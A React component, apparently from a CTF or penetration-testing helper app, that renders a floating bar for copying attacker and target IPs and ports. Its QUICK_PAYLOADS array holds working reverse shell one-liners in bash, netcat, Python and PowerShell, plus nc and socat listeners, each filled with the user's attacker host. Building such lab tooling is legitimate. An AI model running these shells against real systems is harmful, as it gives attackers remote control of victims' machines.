import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Zap, 
  Copy, 
  Check, 
  ChevronUp, 
  ChevronDown, 
  Radio, 
  Terminal, 
  Crosshair, 
  X
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';
import { SyntaxHighlightedCommand } from './SyntaxHighlightedCommand';

interface QuickShell {
  name: string;
  category: 'linux' | 'windows' | 'listener';
  getCommand: (lhost: string, lport: string) => string;
}

const QUICK_PAYLOADS: QuickShell[] = [
  {
    name: 'Bash -i',
    category: 'linux',
    getCommand: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    name: 'Netcat FIFO',
    category: 'linux',
    getCommand: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    name: 'Python3 PTY',
    category: 'linux',
    getCommand: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
  },
  {
    name: 'PowerShell Web',
    category: 'windows',
    getCommand: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    name: 'RLWrap NC Listener',
    category: 'listener',
    getCommand: (_h, p) => `rlwrap nc -lvnp ${p}`,
  },
  {
    name: 'Socat TTY Listener',
    category: 'listener',
    getCommand: (_h, p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
  },
];

export const FloatingPayloadBar: React.FC = () => {
  const { globalVars, setGlobalVars, soundEnabled } = useCtfStore(
    useShallow((s) => ({
      globalVars: s.globalVars,
      setGlobalVars: s.setGlobalVars,
      activeTargetId: s.activeTargetId,
      soundEnabled: s.soundEnabled,
    }))
  );

  const activeMachine = useCtfStore(
    useShallow((s) => {
      if (!s.activeTargetId) return null;
      const m = s.machines.find((box) => box.id === s.activeTargetId);
      if (!m) return null;
      return { id: m.id, name: m.name, ip: m.ip };
    })
  );

  const [isExpanded, setIsExpanded] = useState(false);
  const [showShellDrawer, setShowShellDrawer] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const [showCopyMenu, setShowCopyMenu] = useState(false);
  const copyMenuRef = React.useRef<HTMLDivElement>(null);

  React.useEffect(() => {
    if (!showCopyMenu) return;
    const handleClickOutside = (e: MouseEvent) => {
      if (copyMenuRef.current && !copyMenuRef.current.contains(e.target as Node)) {
        setShowCopyMenu(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, [showCopyMenu]);

  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';
  const targetIp = activeMachine?.ip || globalVars.targetIp || '10.10.10.X';
  const currentInterface = globalVars.interface || 'tun0';

  const allTacticalInfo = useMemo(() => {
    if (activeMachine) {
      return `${activeMachine.name} (${targetIp}) | LHOST: ${lhost}:${lport}`;
    }
    return `Target: ${targetIp} | LHOST: ${lhost}:${lport}`;
  }, [activeMachine, targetIp, lhost, lport]);

  const envExportString = useMemo(() => {
    return `export IP=${targetIp} LHOST=${lhost} LPORT=${lport}`;
  }, [targetIp, lhost, lport]);

  const copyWithFeedback = (key: string, text: string) => {
    safeCopyToClipboard(text);
    if (soundEnabled) playCyberSound('copy');
    setCopiedKey(key);
    setTimeout(() => {
      setCopiedKey((prev) => (prev === key ? null : prev));
    }, 1800);
  };

  const handleLhostChange = (val: string) => {
    setGlobalVars({ lhost: val.trim() });
  };

  const handleLportChange = (val: string) => {
    setGlobalVars({ lport: val.trim() });
  };

  const handleInterfaceToggle = () => {
    const nextIf = currentInterface === 'tun0' ? 'eth0' : currentInterface === 'eth0' ? 'ens33' : 'tun0';
    setGlobalVars({ interface: nextIf });
    if (soundEnabled) playCyberSound('click');
  };

  const menuItemCls =
    'w-full flex items-center justify-between p-2 rounded-lg hover:bg-surface-hover text-left transition-[transform,background-color,color] active:scale-[0.98] cursor-pointer group';
  const menuIconCls = 'w-3.5 h-3.5 text-muted group-hover:text-primary shrink-0';

  return (
    <aside
      aria-label="Tactical Payload Bar"
      className="hidden md:block fixed bottom-3 right-3 z-40 font-sans select-none"
      onKeyDown={(e) => {
        if (e.key === 'Escape' && isExpanded) setIsExpanded(false);
      }}
    >
      <AnimatePresence initial={false}>
        {!isExpanded ? (
          /* Collapsed pill: small, one line, never wider than its content */
          <motion.div
            key="minimized-chip"
            initial={{ opacity: 0, scale: 0.95, y: 6 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 4, transition: { duration: 0.12 } }}
            transition={{ duration: 0.18 }}
            className="relative flex items-center gap-1.5 h-8 pl-3 pr-1.5 rounded-full bg-surface-card border border-subtle shadow-md text-primary hover:border-strong transition-colors cursor-pointer group machined-edge"
            onClick={() => setIsExpanded(true)}
          >
            {/* Quick copy menu popover */}
            <AnimatePresence>
              {showCopyMenu && (
                <motion.div
                  ref={copyMenuRef}
                  initial={{ opacity: 0, y: 8, scale: 0.97 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: 4, scale: 0.98 }}
                  transition={{ duration: 0.14 }}
                  className="absolute bottom-full mb-2 right-0 w-80 rounded-xl bg-surface-elevated border border-subtle shadow-xl p-2 z-50 space-y-0.5 text-xs cursor-default"
                  onClick={(e) => e.stopPropagation()}
                >
                  <div className="flex items-center justify-between px-2 py-1 text-[11px] font-medium text-muted border-b border-subtle">
                    <span className="flex items-center gap-1.5">
                      <Copy className="w-3 h-3" /> Quick Copy All / Fields
                    </span>
                    <button
                      onClick={() => setShowCopyMenu(false)}
                      className="p-1 rounded-md hover:text-primary hover:bg-surface-hover transition-colors cursor-pointer"
                      title="Close"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  </div>

                  {/* Copy all */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-all', allTacticalInfo);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className={menuItemCls}
                  >
                    <div className="flex flex-col min-w-0 pr-2">
                      <span className="font-medium text-primary">Copy All Tactical Info</span>
                      <span className="text-[11px] text-muted truncate font-mono tabular-nums">{allTacticalInfo}</span>
                    </div>
                    {copiedKey === 'menu-all' ? (
                      <Check className="w-4 h-4 text-callout-success-fg shrink-0" />
                    ) : (
                      <Copy className="w-4 h-4 text-muted group-hover:text-primary shrink-0" />
                    )}
                  </button>

                  {/* Target IP */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-target', targetIp);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className={menuItemCls}
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Crosshair className={menuIconCls} />
                      <span className="text-secondary">Target IP</span>
                      <span className="text-primary font-medium font-mono tabular-nums truncate">{targetIp}</span>
                    </div>
                    {copiedKey === 'menu-target' ? (
                      <Check className="w-3.5 h-3.5 text-callout-success-fg shrink-0" />
                    ) : (
                      <Copy className={menuIconCls} />
                    )}
                  </button>

                  {/* Machine name */}
                  {activeMachine && (
                    <button
                      onClick={() => {
                        copyWithFeedback('menu-name', activeMachine.name);
                        setTimeout(() => setShowCopyMenu(false), 900);
                      }}
                      className={menuItemCls}
                    >
                      <div className="flex items-center gap-2 min-w-0">
                        <span className="text-secondary">Name</span>
                        <span className="text-primary font-medium truncate">{activeMachine.name}</span>
                      </div>
                      {copiedKey === 'menu-name' ? (
                        <Check className="w-3.5 h-3.5 text-callout-success-fg shrink-0" />
                      ) : (
                        <Copy className={menuIconCls} />
                      )}
                    </button>
                  )}

                  {/* LHOST:LPORT */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-lhost-port', `${lhost}:${lport}`);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className={menuItemCls}
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Zap className={menuIconCls} />
                      <span className="text-secondary">LHOST:PORT</span>
                      <span className="text-primary font-medium font-mono tabular-nums truncate">
                        {lhost}:{lport}
                      </span>
                    </div>
                    {copiedKey === 'menu-lhost-port' ? (
                      <Check className="w-3.5 h-3.5 text-callout-success-fg shrink-0" />
                    ) : (
                      <Copy className={menuIconCls} />
                    )}
                  </button>

                  {/* Shell export */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-env', envExportString);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className={`${menuItemCls} border-t border-subtle`}
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Terminal className={menuIconCls} />
                      <span className="text-[11px] font-mono tabular-nums text-secondary truncate">{envExportString}</span>
                    </div>
                    {copiedKey === 'menu-env' ? (
                      <Check className="w-3.5 h-3.5 text-callout-success-fg shrink-0" />
                    ) : (
                      <Copy className={menuIconCls} />
                    )}
                  </button>
                </motion.div>
              )}
            </AnimatePresence>

            <div className="flex items-center gap-1 text-xs font-medium text-primary">
              <span className="font-mono tabular-nums">{lhost}:{lport}</span>
              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  copyWithFeedback('min-lhost-btn', lhost);
                }}
                title={`Copy LHOST (${lhost})`}
                aria-label="Copy LHOST"
                className="p-1 hover:bg-surface-hover rounded text-muted hover:text-primary transition-[opacity,color] cursor-pointer opacity-0 group-hover:opacity-100 group-focus-within:opacity-100 focus-visible:opacity-100 [@media(hover:none)]:opacity-100"
              >
                {copiedKey === 'min-lhost-btn' ? (
                  <Check className="w-3 h-3 text-callout-success-fg" />
                ) : (
                  <Copy className="w-3 h-3" />
                )}
              </button>
            </div>

            {activeMachine && (
              <div
                onClick={(e) => {
                  e.stopPropagation();
                  copyWithFeedback('chip-target-ip', targetIp);
                }}
                title={`Click to copy target IP (${targetIp})`}
                className="hidden xl:flex items-center gap-1 text-[11px] text-muted pl-1.5 border-l border-subtle cursor-pointer hover:text-primary transition-colors"
              >
                <span className="text-primary font-medium">{activeMachine.name}</span>
                <span className="font-mono tabular-nums">({targetIp})</span>
                {copiedKey === 'chip-target-ip' && (
                  <Check className="w-3 h-3 text-callout-success-fg ml-0.5" />
                )}
              </div>
            )}

            <button
              onClick={(e) => {
                e.stopPropagation();
                // Copy target IP immediately on click for instant clipboard utility
                copyWithFeedback('min-copy-btn', targetIp);
                setShowCopyMenu((prev) => !prev);
              }}
              title={`Copy Target IP (${targetIp}) & Open Tactical Quick Menu`}
              aria-label="Open Quick Copy Menu"
              className="p-1 hover:bg-surface-hover rounded-full text-muted hover:text-primary transition-colors cursor-pointer"
            >
              {copiedKey === 'min-copy-btn' || copiedKey?.startsWith('menu') || copiedKey === 'min-lhost' ? (
                <Check className="w-3.5 h-3.5 text-callout-success-fg" />
              ) : (
                <Copy className="w-3.5 h-3.5" />
              )}
            </button>

            <ChevronUp className="w-3.5 h-3.5 text-muted group-hover:text-primary transition-colors mr-1" aria-hidden="true" />
          </motion.div>
        ) : (
          /* Expanded payload controller */
          <motion.div
            key="expanded-bar"
            initial={{ opacity: 0, y: 12, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 8, scale: 0.98, transition: { duration: 0.12 } }}
            transition={{ duration: 0.16 }}
            className="w-[calc(100vw-1.5rem)] sm:w-[480px] rounded-2xl bg-surface-card border border-subtle shadow-xl overflow-hidden text-primary machined-edge"
          >
            {/* Header */}
            <div className="flex items-center justify-between px-3 py-2 bg-surface-sunken border-b border-subtle">
              <span className="text-xs font-semibold text-primary flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5 text-muted" /> Payload controller
              </span>

              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => copyWithFeedback('hud-copy-all', allTacticalInfo)}
                  title="Copy All Tactical Info"
                  className="text-[11px] px-2.5 py-1 rounded-md bg-surface-card hover:bg-surface-hover text-primary font-medium border border-subtle flex items-center gap-1 transition-[transform,background-color,border-color,color] active:scale-[0.97] cursor-pointer"
                >
                  {copiedKey === 'hud-copy-all' ? (
                    <>
                      <Check className="w-2.5 h-2.5 text-callout-success-fg" />
                      <span>Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-2.5 h-2.5" />
                      <span>Copy All</span>
                    </>
                  )}
                </button>
                <button
                  onClick={handleInterfaceToggle}
                  title="Toggle Network Interface"
                  className="text-[11px] px-2.5 py-1 rounded-md bg-surface-card hover:bg-surface-hover text-secondary font-mono tabular-nums font-medium border border-subtle flex items-center gap-1 transition-[transform,background-color,border-color,color] active:scale-[0.97] cursor-pointer"
                >
                  <Radio className="w-2.5 h-2.5" />
                  {currentInterface}
                </button>
                <button
                  onClick={() => setIsExpanded(false)}
                  title="Minimize Bar"
                  aria-label="Minimize payload bar"
                  className="p-1 hover:bg-surface-hover rounded-md text-muted hover:text-primary transition-colors cursor-pointer"
                >
                  <ChevronDown className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Controls */}
            <div className="p-3 space-y-2.5">
              <div className="grid grid-cols-12 gap-2">
                {/* LHOST */}
                <div className="col-span-7 space-y-1">
                  <div className="flex items-center justify-between text-[11px] text-muted font-medium">
                    <span>LHOST (Attacker)</span>
                    <button
                      onClick={() => copyWithFeedback('lhost', lhost)}
                      className="text-secondary hover:text-primary flex items-center gap-0.5 cursor-pointer"
                    >
                      {copiedKey === 'lhost' ? <Check className="w-2.5 h-2.5 text-callout-success-fg" /> : <Copy className="w-2.5 h-2.5" />}
                      {copiedKey === 'lhost' ? 'Copied' : 'Copy'}
                    </button>
                  </div>
                  <input
                    type="text"
                    value={lhost}
                    onChange={(e) => handleLhostChange(e.target.value)}
                    placeholder="10.10.14.X"
                    className="w-full bg-surface-sunken border border-subtle focus:border-accent rounded-lg px-2.5 py-1.5 text-xs text-primary font-mono tabular-nums outline-none transition-colors"
                  />
                </div>

                {/* LPORT */}
                <div className="col-span-5 space-y-1">
                  <div className="flex items-center justify-between text-[11px] text-muted font-medium">
                    <span>LPORT</span>
                    <button
                      onClick={() => copyWithFeedback('lport', lport)}
                      className="text-secondary hover:text-primary flex items-center gap-0.5 cursor-pointer"
                    >
                      {copiedKey === 'lport' ? <Check className="w-2.5 h-2.5 text-callout-success-fg" /> : <Copy className="w-2.5 h-2.5" />}
                      {copiedKey === 'lport' ? 'Copied' : 'Copy'}
                    </button>
                  </div>
                  <input
                    type="text"
                    maxLength={5}
                    value={lport}
                    onChange={(e) => handleLportChange(e.target.value)}
                    placeholder="4444"
                    className="w-full bg-surface-sunken border border-subtle focus:border-accent rounded-lg px-2.5 py-1.5 text-xs text-primary font-mono tabular-nums outline-none transition-colors"
                  />
                </div>
              </div>

              {/* Active target */}
              <div className="flex items-center justify-between px-3 py-2 rounded-xl bg-surface-sunken border border-subtle text-xs">
                <div className="flex items-center gap-2 overflow-hidden">
                  <Crosshair className="w-3.5 h-3.5 text-muted shrink-0" />
                  <span className="text-muted text-[11px]">Target</span>
                  <span className="font-medium text-primary truncate max-w-[140px]">
                    {activeMachine ? activeMachine.name : 'No Target Engaged'}
                  </span>
                  <span className="font-mono tabular-nums text-secondary text-[11px] truncate">
                    ({targetIp})
                  </span>
                </div>

                <div className="flex items-center gap-1 shrink-0">
                  <button
                    onClick={() => copyWithFeedback('hud-env', envExportString)}
                    title={`Copy Shell Export: ${envExportString}`}
                    className="p-1.5 hover:bg-surface-hover rounded-md text-muted hover:text-primary transition-colors cursor-pointer"
                  >
                    {copiedKey === 'hud-env' ? (
                      <Check className="w-3.5 h-3.5 text-callout-success-fg" />
                    ) : (
                      <Terminal className="w-3.5 h-3.5" />
                    )}
                  </button>
                  <button
                    onClick={() => copyWithFeedback('targetIp', targetIp)}
                    title="Copy Target IP"
                    className="p-1.5 hover:bg-surface-hover rounded-md text-muted hover:text-primary transition-colors cursor-pointer"
                  >
                    {copiedKey === 'targetIp' ? (
                      <Check className="w-3.5 h-3.5 text-callout-success-fg" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                </div>
              </div>

              {/* Quick reverse shells */}
              <div>
                <button
                  onClick={() => setShowShellDrawer(!showShellDrawer)}
                  className="w-full flex items-center justify-between px-3 py-1.5 rounded-lg bg-surface-sunken hover:bg-surface-hover border border-subtle text-[11px] text-secondary hover:text-primary font-medium transition-[transform,background-color,border-color,color] active:scale-[0.98] cursor-pointer"
                >
                  <span className="flex items-center gap-1.5">
                    <Zap className="w-3 h-3" /> Quick 1-Click Reverse Shells
                  </span>
                  {showShellDrawer ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                </button>

                <AnimatePresence>
                  {showShellDrawer && (
                    <motion.div
                      initial={{ opacity: 0, y: -6 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -6, transition: { duration: 0.12 } }}
                      transition={{ duration: 0.15, ease: 'easeOut' }}
                      className="mt-1.5 space-y-1 overflow-hidden will-change-transform"
                    >
                      {QUICK_PAYLOADS.map((shell) => {
                        const cmd = shell.getCommand(lhost, lport);
                        const isCopied = copiedKey === `shell-${shell.name}`;

                        return (
                          <div
                            key={shell.name}
                            onClick={() => copyWithFeedback(`shell-${shell.name}`, cmd)}
                            className="flex items-center justify-between p-2 px-2.5 rounded-lg bg-surface-sunken hover:bg-surface-hover border border-subtle cursor-pointer group transition-[transform,background-color,border-color,color] active:scale-[0.98]"
                          >
                            <div className="flex items-center gap-2 min-w-0 pr-2">
                              <span className="text-[11px] text-muted w-[52px] flex-shrink-0">{shell.category}</span>
                              <span className="text-[11px] font-medium text-primary flex-shrink-0">{shell.name}</span>
                              <span className="sr-only">{cmd}</span>
                              <span
                                aria-hidden="true"
                                className="text-[10px] font-mono tabular-nums bg-surface-inverse text-on-inverse rounded px-1.5 py-0.5 truncate max-w-[160px] sm:max-w-[200px]"
                              >
                                <SyntaxHighlightedCommand command={cmd} />
                              </span>
                            </div>

                            <button
                              title="Copy Payload"
                              className="p-1 text-muted group-hover:text-primary shrink-0"
                            >
                              {isCopied ? (
                                <Check className="w-3.5 h-3.5 text-callout-success-fg" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          </div>
                        );
                      })}
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </aside>
  );
};
export default FloatingPayloadBar;
